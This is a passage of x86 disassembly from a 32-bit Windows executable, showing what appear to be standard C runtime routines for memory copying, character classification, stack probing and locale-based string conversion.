  40741a:	0f 82 a4 01 00 00    	jb     0x4075c4
  407420:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  407426:	72 1f                	jb     0x407447
  407428:	83 3d 04 d9 40 00 00 	cmpl   $0x0,0x40d904
  40742f:	74 16                	je     0x407447
  407431:	57                   	push   %edi
  407432:	56                   	push   %esi
  407433:	83 e7 0f             	and    $0xf,%edi
  407436:	83 e6 0f             	and    $0xf,%esi
  407439:	3b fe                	cmp    %esi,%edi
  40743b:	5e                   	pop    %esi
  40743c:	5f                   	pop    %edi
  40743d:	75 08                	jne    0x407447
  40743f:	5e                   	pop    %esi
  407440:	5f                   	pop    %edi
  407441:	5d                   	pop    %ebp
  407442:	e9 ce d6 ff ff       	jmp    0x404b15
  407447:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40744d:	75 15                	jne    0x407464
  40744f:	c1 e9 02             	shr    $0x2,%ecx
  407452:	83 e2 03             	and    $0x3,%edx
  407455:	83 f9 08             	cmp    $0x8,%ecx
  407458:	72 2a                	jb     0x407484
  40745a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40745c:	ff 24 95 74 75 40 00 	jmp    *0x407574(,%edx,4)
  407463:	90                   	nop
  407464:	8b c7                	mov    %edi,%eax
  407466:	ba 03 00 00 00       	mov    $0x3,%edx
  40746b:	83 e9 04             	sub    $0x4,%ecx
  40746e:	72 0c                	jb     0x40747c
  407470:	83 e0 03             	and    $0x3,%eax
  407473:	03 c8                	add    %eax,%ecx
  407475:	ff 24 85 88 74 40 00 	jmp    *0x407488(,%eax,4)
  40747c:	ff 24 8d 84 75 40 00 	jmp    *0x407584(,%ecx,4)
  407483:	90                   	nop
  407484:	ff 24 8d 08 75 40 00 	jmp    *0x407508(,%ecx,4)
  40748b:	90                   	nop
  40748c:	98                   	cwtl
  40748d:	74 40                	je     0x4074cf
  40748f:	00 c4                	add    %al,%ah
  407491:	74 40                	je     0x4074d3
  407493:	00 e8                	add    %ch,%al
  407495:	74 40                	je     0x4074d7
  407497:	00 23                	add    %ah,(%ebx)
  407499:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  40749f:	46                   	inc    %esi
  4074a0:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  4074a6:	02 c1                	add    %cl,%al
  4074a8:	e9 02 88 47 02       	jmp    0x287fcaf
  4074ad:	83 c6 03             	add    $0x3,%esi
  4074b0:	83 c7 03             	add    $0x3,%edi
  4074b3:	83 f9 08             	cmp    $0x8,%ecx
  4074b6:	72 cc                	jb     0x407484
  4074b8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4074ba:	ff 24 95 74 75 40 00 	jmp    *0x407574(,%edx,4)
  4074c1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4074c4:	23 d1                	and    %ecx,%edx
  4074c6:	8a 06                	mov    (%esi),%al
  4074c8:	88 07                	mov    %al,(%edi)
  4074ca:	8a 46 01             	mov    0x1(%esi),%al
  4074cd:	c1 e9 02             	shr    $0x2,%ecx
  4074d0:	88 47 01             	mov    %al,0x1(%edi)
  4074d3:	83 c6 02             	add    $0x2,%esi
  4074d6:	83 c7 02             	add    $0x2,%edi
  4074d9:	83 f9 08             	cmp    $0x8,%ecx
  4074dc:	72 a6                	jb     0x407484
  4074de:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4074e0:	ff 24 95 74 75 40 00 	jmp    *0x407574(,%edx,4)
  4074e7:	90                   	nop
  4074e8:	23 d1                	and    %ecx,%edx
  4074ea:	8a 06                	mov    (%esi),%al
  4074ec:	88 07                	mov    %al,(%edi)
  4074ee:	83 c6 01             	add    $0x1,%esi
  4074f1:	c1 e9 02             	shr    $0x2,%ecx
  4074f4:	83 c7 01             	add    $0x1,%edi
  4074f7:	83 f9 08             	cmp    $0x8,%ecx
  4074fa:	72 88                	jb     0x407484
  4074fc:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4074fe:	ff 24 95 74 75 40 00 	jmp    *0x407574(,%edx,4)
  407505:	8d 49 00             	lea    0x0(%ecx),%ecx
  407508:	6b 75 40 00          	imul   $0x0,0x40(%ebp),%esi
  40750c:	58                   	pop    %eax
  40750d:	75 40                	jne    0x40754f
  40750f:	00 50 75             	add    %dl,0x75(%eax)
  407512:	40                   	inc    %eax
  407513:	00 48 75             	add    %cl,0x75(%eax)
  407516:	40                   	inc    %eax
  407517:	00 40 75             	add    %al,0x75(%eax)
  40751a:	40                   	inc    %eax
  40751b:	00 38                	add    %bh,(%eax)
  40751d:	75 40                	jne    0x40755f
  40751f:	00 30                	add    %dh,(%eax)
  407521:	75 40                	jne    0x407563
  407523:	00 28                	add    %ch,(%eax)
  407525:	75 40                	jne    0x407567
  407527:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  40752d:	44                   	inc    %esp
  40752e:	8f                   	(bad)
  40752f:	e4 8b                	in     $0x8b,%al
  407531:	44                   	inc    %esp
  407532:	8e e8                	mov    %eax,%gs
  407534:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  407538:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  40753c:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  407540:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  407544:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  407548:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  40754c:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  407550:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  407554:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  407558:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  40755c:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  407560:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  407567:	03 f0                	add    %eax,%esi
  407569:	03 f8                	add    %eax,%edi
  40756b:	ff 24 95 74 75 40 00 	jmp    *0x407574(,%edx,4)
  407572:	8b ff                	mov    %edi,%edi
  407574:	84 75 40             	test   %dh,0x40(%ebp)
  407577:	00 8c 75 40 00 98 75 	add    %cl,0x75980040(%ebp,%esi,2)
  40757e:	40                   	inc    %eax
  40757f:	00 ac 75 40 00 8b 45 	add    %ch,0x458b0040(%ebp,%esi,2)
  407586:	08 5e 5f             	or     %bl,0x5f(%esi)
  407589:	c9                   	leave
  40758a:	c3                   	ret
  40758b:	90                   	nop
  40758c:	8a 06                	mov    (%esi),%al
  40758e:	88 07                	mov    %al,(%edi)
  407590:	8b 45 08             	mov    0x8(%ebp),%eax
  407593:	5e                   	pop    %esi
  407594:	5f                   	pop    %edi
  407595:	c9                   	leave
  407596:	c3                   	ret
  407597:	90                   	nop
  407598:	8a 06                	mov    (%esi),%al
  40759a:	88 07                	mov    %al,(%edi)
  40759c:	8a 46 01             	mov    0x1(%esi),%al
  40759f:	88 47 01             	mov    %al,0x1(%edi)
  4075a2:	8b 45 08             	mov    0x8(%ebp),%eax
  4075a5:	5e                   	pop    %esi
  4075a6:	5f                   	pop    %edi
  4075a7:	c9                   	leave
  4075a8:	c3                   	ret
  4075a9:	8d 49 00             	lea    0x0(%ecx),%ecx
  4075ac:	8a 06                	mov    (%esi),%al
  4075ae:	88 07                	mov    %al,(%edi)
  4075b0:	8a 46 01             	mov    0x1(%esi),%al
  4075b3:	88 47 01             	mov    %al,0x1(%edi)
  4075b6:	8a 46 02             	mov    0x2(%esi),%al
  4075b9:	88 47 02             	mov    %al,0x2(%edi)
  4075bc:	8b 45 08             	mov    0x8(%ebp),%eax
  4075bf:	5e                   	pop    %esi
  4075c0:	5f                   	pop    %edi
  4075c1:	c9                   	leave
  4075c2:	c3                   	ret
  4075c3:	90                   	nop
  4075c4:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  4075c8:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  4075cc:	f7 c7 03 00 00 00    	test   $0x3,%edi
  4075d2:	75 24                	jne    0x4075f8
  4075d4:	c1 e9 02             	shr    $0x2,%ecx
  4075d7:	83 e2 03             	and    $0x3,%edx
  4075da:	83 f9 08             	cmp    $0x8,%ecx
  4075dd:	72 0d                	jb     0x4075ec
  4075df:	fd                   	std
  4075e0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4075e2:	fc                   	cld
  4075e3:	ff 24 95 10 77 40 00 	jmp    *0x407710(,%edx,4)
  4075ea:	8b ff                	mov    %edi,%edi
  4075ec:	f7 d9                	neg    %ecx
  4075ee:	ff 24 8d c0 76 40 00 	jmp    *0x4076c0(,%ecx,4)
  4075f5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4075f8:	8b c7                	mov    %edi,%eax
  4075fa:	ba 03 00 00 00       	mov    $0x3,%edx
  4075ff:	83 f9 04             	cmp    $0x4,%ecx
  407602:	72 0c                	jb     0x407610
  407604:	83 e0 03             	and    $0x3,%eax
  407607:	2b c8                	sub    %eax,%ecx
  407609:	ff 24 85 14 76 40 00 	jmp    *0x407614(,%eax,4)
  407610:	ff 24 8d 10 77 40 00 	jmp    *0x407710(,%ecx,4)
  407617:	90                   	nop
  407618:	24 76                	and    $0x76,%al
  40761a:	40                   	inc    %eax
  40761b:	00 48 76             	add    %cl,0x76(%eax)
  40761e:	40                   	inc    %eax
  40761f:	00 70 76             	add    %dh,0x76(%eax)
  407622:	40                   	inc    %eax
  407623:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  407629:	88 47 03             	mov    %al,0x3(%edi)
  40762c:	83 ee 01             	sub    $0x1,%esi
  40762f:	c1 e9 02             	shr    $0x2,%ecx
  407632:	83 ef 01             	sub    $0x1,%edi
  407635:	83 f9 08             	cmp    $0x8,%ecx
  407638:	72 b2                	jb     0x4075ec
  40763a:	fd                   	std
  40763b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40763d:	fc                   	cld
  40763e:	ff 24 95 10 77 40 00 	jmp    *0x407710(,%edx,4)
  407645:	8d 49 00             	lea    0x0(%ecx),%ecx
  407648:	8a 46 03             	mov    0x3(%esi),%al
  40764b:	23 d1                	and    %ecx,%edx
  40764d:	88 47 03             	mov    %al,0x3(%edi)
  407650:	8a 46 02             	mov    0x2(%esi),%al
  407653:	c1 e9 02             	shr    $0x2,%ecx
  407656:	88 47 02             	mov    %al,0x2(%edi)
  407659:	83 ee 02             	sub    $0x2,%esi
  40765c:	83 ef 02             	sub    $0x2,%edi
  40765f:	83 f9 08             	cmp    $0x8,%ecx
  407662:	72 88                	jb     0x4075ec
  407664:	fd                   	std
  407665:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407667:	fc                   	cld
  407668:	ff 24 95 10 77 40 00 	jmp    *0x407710(,%edx,4)
  40766f:	90                   	nop
  407670:	8a 46 03             	mov    0x3(%esi),%al
  407673:	23 d1                	and    %ecx,%edx
  407675:	88 47 03             	mov    %al,0x3(%edi)
  407678:	8a 46 02             	mov    0x2(%esi),%al
  40767b:	88 47 02             	mov    %al,0x2(%edi)
  40767e:	8a 46 01             	mov    0x1(%esi),%al
  407681:	c1 e9 02             	shr    $0x2,%ecx
  407684:	88 47 01             	mov    %al,0x1(%edi)
  407687:	83 ee 03             	sub    $0x3,%esi
  40768a:	83 ef 03             	sub    $0x3,%edi
  40768d:	83 f9 08             	cmp    $0x8,%ecx
  407690:	0f 82 56 ff ff ff    	jb     0x4075ec
  407696:	fd                   	std
  407697:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407699:	fc                   	cld
  40769a:	ff 24 95 10 77 40 00 	jmp    *0x407710(,%edx,4)
  4076a1:	8d 49 00             	lea    0x0(%ecx),%ecx
  4076a4:	c4 76 40             	les    0x40(%esi),%esi
  4076a7:	00 cc                	add    %cl,%ah
  4076a9:	76 40                	jbe    0x4076eb
  4076ab:	00 d4                	add    %dl,%ah
  4076ad:	76 40                	jbe    0x4076ef
  4076af:	00 dc                	add    %bl,%ah
  4076b1:	76 40                	jbe    0x4076f3
  4076b3:	00 e4                	add    %ah,%ah
  4076b5:	76 40                	jbe    0x4076f7
  4076b7:	00 ec                	add    %ch,%ah
  4076b9:	76 40                	jbe    0x4076fb
  4076bb:	00 f4                	add    %dh,%ah
  4076bd:	76 40                	jbe    0x4076ff
  4076bf:	00 07                	add    %al,(%edi)
  4076c1:	77 40                	ja     0x407703
  4076c3:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  4076c9:	44                   	inc    %esp
  4076ca:	8f                   	(bad)
  4076cb:	1c 8b                	sbb    $0x8b,%al
  4076cd:	44                   	inc    %esp
  4076ce:	8e 18                	mov    (%eax),%ds
  4076d0:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  4076d4:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  4076d8:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  4076dc:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  4076e0:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  4076e4:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  4076e8:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  4076ec:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  4076f0:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  4076f4:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  4076f8:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  4076fc:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  407703:	03 f0                	add    %eax,%esi
  407705:	03 f8                	add    %eax,%edi
  407707:	ff 24 95 10 77 40 00 	jmp    *0x407710(,%edx,4)
  40770e:	8b ff                	mov    %edi,%edi
  407710:	20 77 40             	and    %dh,0x40(%edi)
  407713:	00 28                	add    %ch,(%eax)
  407715:	77 40                	ja     0x407757
  407717:	00 38                	add    %bh,(%eax)
  407719:	77 40                	ja     0x40775b
  40771b:	00 4c 77 40          	add    %cl,0x40(%edi,%esi,2)
  40771f:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  407725:	c9                   	leave
  407726:	c3                   	ret
  407727:	90                   	nop
  407728:	8a 46 03             	mov    0x3(%esi),%al
  40772b:	88 47 03             	mov    %al,0x3(%edi)
  40772e:	8b 45 08             	mov    0x8(%ebp),%eax
  407731:	5e                   	pop    %esi
  407732:	5f                   	pop    %edi
  407733:	c9                   	leave
  407734:	c3                   	ret
  407735:	8d 49 00             	lea    0x0(%ecx),%ecx
  407738:	8a 46 03             	mov    0x3(%esi),%al
  40773b:	88 47 03             	mov    %al,0x3(%edi)
  40773e:	8a 46 02             	mov    0x2(%esi),%al
  407741:	88 47 02             	mov    %al,0x2(%edi)
  407744:	8b 45 08             	mov    0x8(%ebp),%eax
  407747:	5e                   	pop    %esi
  407748:	5f                   	pop    %edi
  407749:	c9                   	leave
  40774a:	c3                   	ret
  40774b:	90                   	nop
  40774c:	8a 46 03             	mov    0x3(%esi),%al
  40774f:	88 47 03             	mov    %al,0x3(%edi)
  407752:	8a 46 02             	mov    0x2(%esi),%al
  407755:	88 47 02             	mov    %al,0x2(%edi)
  407758:	8a 46 01             	mov    0x1(%esi),%al
  40775b:	88 47 01             	mov    %al,0x1(%edi)
  40775e:	8b 45 08             	mov    0x8(%ebp),%eax
  407761:	5e                   	pop    %esi
  407762:	5f                   	pop    %edi
  407763:	c9                   	leave
  407764:	c3                   	ret
  407765:	55                   	push   %ebp
  407766:	8b ec                	mov    %esp,%ebp
  407768:	83 ec 10             	sub    $0x10,%esp
  40776b:	ff 75 08             	push   0x8(%ebp)
  40776e:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407771:	e8 f1 c1 ff ff       	call   0x403967
  407776:	0f b6 45 0c          	movzbl 0xc(%ebp),%eax
  40777a:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40777d:	8a 55 14             	mov    0x14(%ebp),%dl
  407780:	84 54 01 1d          	test   %dl,0x1d(%ecx,%eax,1)
  407784:	75 1e                	jne    0x4077a4
  407786:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40778a:	74 12                	je     0x40779e
  40778c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40778f:	8b 89 c8 00 00 00    	mov    0xc8(%ecx),%ecx
  407795:	0f b7 04 41          	movzwl (%ecx,%eax,2),%eax
  407799:	23 45 10             	and    0x10(%ebp),%eax
  40779c:	eb 02                	jmp    0x4077a0
  40779e:	33 c0                	xor    %eax,%eax
  4077a0:	85 c0                	test   %eax,%eax
  4077a2:	74 03                	je     0x4077a7
  4077a4:	33 c0                	xor    %eax,%eax
  4077a6:	40                   	inc    %eax
  4077a7:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  4077ab:	74 07                	je     0x4077b4
  4077ad:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4077b0:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  4077b4:	c9                   	leave
  4077b5:	c3                   	ret
  4077b6:	6a 04                	push   $0x4
  4077b8:	6a 00                	push   $0x0
  4077ba:	ff 74 24 0c          	push   0xc(%esp)
  4077be:	6a 00                	push   $0x0
  4077c0:	e8 a0 ff ff ff       	call   0x407765
  4077c5:	83 c4 10             	add    $0x10,%esp
  4077c8:	c3                   	ret
  4077c9:	55                   	push   %ebp
  4077ca:	8b ec                	mov    %esp,%ebp
  4077cc:	83 ec 10             	sub    $0x10,%esp
  4077cf:	ff 75 0c             	push   0xc(%ebp)
  4077d2:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4077d5:	e8 8d c1 ff ff       	call   0x403967
  4077da:	0f b6 45 08          	movzbl 0x8(%ebp),%eax
  4077de:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4077e1:	8b 89 c8 00 00 00    	mov    0xc8(%ecx),%ecx
  4077e7:	0f b7 04 41          	movzwl (%ecx,%eax,2),%eax
  4077eb:	25 00 80 00 00       	and    $0x8000,%eax
  4077f0:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  4077f4:	74 07                	je     0x4077fd
  4077f6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4077f9:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  4077fd:	c9                   	leave
  4077fe:	c3                   	ret
  4077ff:	cc                   	int3
  407800:	51                   	push   %ecx
  407801:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  407805:	2b c8                	sub    %eax,%ecx
  407807:	83 e1 0f             	and    $0xf,%ecx
  40780a:	03 c1                	add    %ecx,%eax
  40780c:	1b c9                	sbb    %ecx,%ecx
  40780e:	0b c1                	or     %ecx,%eax
  407810:	59                   	pop    %ecx
  407811:	e9 ba b0 ff ff       	jmp    0x4028d0
  407816:	51                   	push   %ecx
  407817:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40781b:	2b c8                	sub    %eax,%ecx
  40781d:	83 e1 07             	and    $0x7,%ecx
  407820:	03 c1                	add    %ecx,%eax
  407822:	1b c9                	sbb    %ecx,%ecx
  407824:	0b c1                	or     %ecx,%eax
  407826:	59                   	pop    %ecx
  407827:	e9 a4 b0 ff ff       	jmp    0x4028d0
  40782c:	6a 0a                	push   $0xa
  40782e:	6a 00                	push   $0x0
  407830:	ff 74 24 0c          	push   0xc(%esp)
  407834:	e8 f6 06 00 00       	call   0x407f2f
  407839:	83 c4 0c             	add    $0xc,%esp
  40783c:	c3                   	ret
  40783d:	55                   	push   %ebp
  40783e:	8b ec                	mov    %esp,%ebp
  407840:	83 ec 0c             	sub    $0xc,%esp
  407843:	a1 20 c0 40 00       	mov    0x40c020,%eax
  407848:	33 c5                	xor    %ebp,%eax
  40784a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40784d:	6a 06                	push   $0x6
  40784f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407852:	50                   	push   %eax
  407853:	68 04 10 00 00       	push   $0x1004
  407858:	ff 75 08             	push   0x8(%ebp)
  40785b:	c6 45 fa 00          	movb   $0x0,-0x6(%ebp)
  40785f:	ff 15 4c 91 40 00    	call   *0x40914c
  407865:	85 c0                	test   %eax,%eax
  407867:	75 05                	jne    0x40786e
  407869:	83 c8 ff             	or     $0xffffffff,%eax
  40786c:	eb 0a                	jmp    0x407878
  40786e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407871:	50                   	push   %eax
  407872:	e8 b5 ff ff ff       	call   0x40782c
  407877:	59                   	pop    %ecx
  407878:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40787b:	33 cd                	xor    %ebp,%ecx
  40787d:	e8 58 a7 ff ff       	call   0x401fda
  407882:	c9                   	leave
  407883:	c3                   	ret
  407884:	55                   	push   %ebp
  407885:	8b ec                	mov    %esp,%ebp
  407887:	83 ec 34             	sub    $0x34,%esp
  40788a:	a1 20 c0 40 00       	mov    0x40c020,%eax
  40788f:	33 c5                	xor    %ebp,%eax
  407891:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407894:	8b 45 10             	mov    0x10(%ebp),%eax
  407897:	8b 4d 18             	mov    0x18(%ebp),%ecx
  40789a:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40789d:	8b 45 14             	mov    0x14(%ebp),%eax
  4078a0:	53                   	push   %ebx
  4078a1:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4078a4:	8b 00                	mov    (%eax),%eax
  4078a6:	56                   	push   %esi
  4078a7:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4078aa:	8b 45 08             	mov    0x8(%ebp),%eax
  4078ad:	57                   	push   %edi
  4078ae:	33 ff                	xor    %edi,%edi
  4078b0:	3b 45 0c             	cmp    0xc(%ebp),%eax
  4078b3:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  4078b6:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4078b9:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  4078bc:	0f 84 5f 01 00 00    	je     0x407a21
  4078c2:	8b 35 f0 90 40 00    	mov    0x4090f0,%esi
  4078c8:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4078cb:	51                   	push   %ecx
  4078cc:	50                   	push   %eax
  4078cd:	ff d6                	call   *%esi
  4078cf:	85 c0                	test   %eax,%eax
  4078d1:	8b 1d 98 90 40 00    	mov    0x409098,%ebx
  4078d7:	74 5e                	je     0x407937
  4078d9:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  4078dd:	75 58                	jne    0x407937
  4078df:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4078e2:	50                   	push   %eax
  4078e3:	ff 75 0c             	push   0xc(%ebp)
  4078e6:	ff d6                	call   *%esi
  4078e8:	85 c0                	test   %eax,%eax
  4078ea:	74 4b                	je     0x407937
  4078ec:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  4078f0:	75 45                	jne    0x407937
  4078f2:	8b 75 dc             	mov    -0x24(%ebp),%esi
  4078f5:	83 fe ff             	cmp    $0xffffffff,%esi
  4078f8:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  4078ff:	75 0c                	jne    0x40790d
  407901:	ff 75 d8             	push   -0x28(%ebp)
  407904:	e8 07 ec ff ff       	call   0x406510
  407909:	8b f0                	mov    %eax,%esi
  40790b:	59                   	pop    %ecx
  40790c:	46                   	inc    %esi
  40790d:	3b f7                	cmp    %edi,%esi
  40790f:	7e 5b                	jle    0x40796c
  407911:	81 fe f0 ff ff 7f    	cmp    $0x7ffffff0,%esi
  407917:	77 53                	ja     0x40796c
  407919:	8d 44 36 08          	lea    0x8(%esi,%esi,1),%eax
  40791d:	3d 00 04 00 00       	cmp    $0x400,%eax
  407922:	77 2f                	ja     0x407953
  407924:	e8 d7 fe ff ff       	call   0x407800
  407929:	8b c4                	mov    %esp,%eax
  40792b:	3b c7                	cmp    %edi,%eax
  40792d:	74 38                	je     0x407967
  40792f:	c7 00 cc cc 00 00    	movl   $0xcccc,(%eax)
  407935:	eb 2d                	jmp    0x407964
  407937:	57                   	push   %edi
  407938:	57                   	push   %edi
  407939:	ff 75 dc             	push   -0x24(%ebp)
  40793c:	ff 75 d8             	push   -0x28(%ebp)
  40793f:	6a 01                	push   $0x1
  407941:	ff 75 08             	push   0x8(%ebp)
  407944:	ff d3                	call   *%ebx
  407946:	8b f0                	mov    %eax,%esi
  407948:	3b f7                	cmp    %edi,%esi
  40794a:	75 c3                	jne    0x40790f
  40794c:	33 c0                	xor    %eax,%eax
  40794e:	e9 d1 00 00 00       	jmp    0x407a24
  407953:	50                   	push   %eax
  407954:	e8 13 b4 ff ff       	call   0x402d6c
  407959:	3b c7                	cmp    %edi,%eax
  40795b:	59                   	pop    %ecx
  40795c:	74 09                	je     0x407967
  40795e:	c7 00 dd dd 00 00    	movl   $0xdddd,(%eax)
  407964:	83 c0 08             	add    $0x8,%eax
  407967:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40796a:	eb 03                	jmp    0x40796f
  40796c:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40796f:	39 7d e4             	cmp    %edi,-0x1c(%ebp)
  407972:	74 d8                	je     0x40794c
  407974:	8d 04 36             	lea    (%esi,%esi,1),%eax
  407977:	50                   	push   %eax
  407978:	57                   	push   %edi
  407979:	ff 75 e4             	push   -0x1c(%ebp)
  40797c:	e8 df a5 ff ff       	call   0x401f60
  407981:	83 c4 0c             	add    $0xc,%esp
  407984:	56                   	push   %esi
  407985:	ff 75 e4             	push   -0x1c(%ebp)
  407988:	ff 75 dc             	push   -0x24(%ebp)
  40798b:	ff 75 d8             	push   -0x28(%ebp)
  40798e:	6a 01                	push   $0x1
  407990:	ff 75 08             	push   0x8(%ebp)
  407993:	ff d3                	call   *%ebx
  407995:	85 c0                	test   %eax,%eax
  407997:	74 7f                	je     0x407a18
  407999:	8b 5d cc             	mov    -0x34(%ebp),%ebx
  40799c:	3b df                	cmp    %edi,%ebx
  40799e:	74 1d                	je     0x4079bd
  4079a0:	57                   	push   %edi
  4079a1:	57                   	push   %edi
  4079a2:	ff 75 1c             	push   0x1c(%ebp)
  4079a5:	53                   	push   %ebx
  4079a6:	56                   	push   %esi
  4079a7:	ff 75 e4             	push   -0x1c(%ebp)
  4079aa:	57                   	push   %edi
  4079ab:	ff 75 0c             	push   0xc(%ebp)
  4079ae:	ff 15 2c 91 40 00    	call   *0x40912c
  4079b4:	85 c0                	test   %eax,%eax
  4079b6:	74 60                	je     0x407a18
  4079b8:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  4079bb:	eb 5b                	jmp    0x407a18
  4079bd:	39 7d d4             	cmp    %edi,-0x2c(%ebp)
  4079c0:	8b 1d 2c 91 40 00    	mov    0x40912c,%ebx
  4079c6:	75 14                	jne    0x4079dc
  4079c8:	57                   	push   %edi
  4079c9:	57                   	push   %edi
  4079ca:	57                   	push   %edi
  4079cb:	57                   	push   %edi
  4079cc:	56                   	push   %esi
  4079cd:	ff 75 e4             	push   -0x1c(%ebp)
  4079d0:	57                   	push   %edi
  4079d1:	ff 75 0c             	push   0xc(%ebp)
  4079d4:	ff d3                	call   *%ebx
  4079d6:	8b f0                	mov    %eax,%esi
  4079d8:	3b f7                	cmp    %edi,%esi
  4079da:	74 3c                	je     0x407a18
  4079dc:	56                   	push   %esi
  4079dd:	6a 01                	push   $0x1
  4079df:	e8 a2 c7 ff ff       	call   0x404186
  4079e4:	3b c7                	cmp    %edi,%eax
  4079e6:	59                   	pop    %ecx
  4079e7:	59                   	pop    %ecx
  4079e8:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4079eb:	74 2b                	je     0x407a18
  4079ed:	57                   	push   %edi
  4079ee:	57                   	push   %edi
  4079ef:	56                   	push   %esi
  4079f0:	50                   	push   %eax
  4079f1:	56                   	push   %esi
  4079f2:	ff 75 e4             	push   -0x1c(%ebp)
  4079f5:	57                   	push   %edi
  4079f6:	ff 75 0c             	push   0xc(%ebp)
  4079f9:	ff d3                	call   *%ebx
  4079fb:	3b c7                	cmp    %edi,%eax
  4079fd:	75 0e                	jne    0x407a0d
  4079ff:	ff 75 e0             	push   -0x20(%ebp)
  407a02:	e8 88 b2 ff ff       	call   0x402c8f
  407a07:	59                   	pop    %ecx
  407a08:	89 7d e0             	mov    %edi,-0x20(%ebp)
  407a0b:	eb 0b                	jmp    0x407a18
  407a0d:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  407a11:	74 05                	je     0x407a18
  407a13:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407a16:	89 01                	mov    %eax,(%ecx)
  407a18:	ff 75 e4             	push   -0x1c(%ebp)
  407a1b:	e8 03 e9 ff ff       	call   0x406323
  407a20:	59                   	pop    %ecx
  407a21:	8b 45 e0             	mov    -0x20(%ebp),%eax
  407a24:	8d 65 c0             	lea    -0x40(%ebp),%esp
  407a27:	5f                   	pop    %edi
  407a28:	5e                   	pop    %esi
  407a29:	5b                   	pop    %ebx
  407a2a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407a2d:	33 cd                	xor    %ebp,%ecx
  407a2f:	e8 a6 a5 ff ff       	call   0x401fda
  407a34:	c9                   	leave
  407a35:	c3                   	ret
  407a36:	cc                   	int3
  407a37:	cc                   	int3
  407a38:	55                   	push   %ebp
  407a39:	8b ec                	mov    %esp,%ebp
  407a3b:	53                   	push   %ebx
  407a3c:	56                   	push   %esi
  407a3d:	57                   	push   %edi
  407a3e:	55                   	push   %ebp
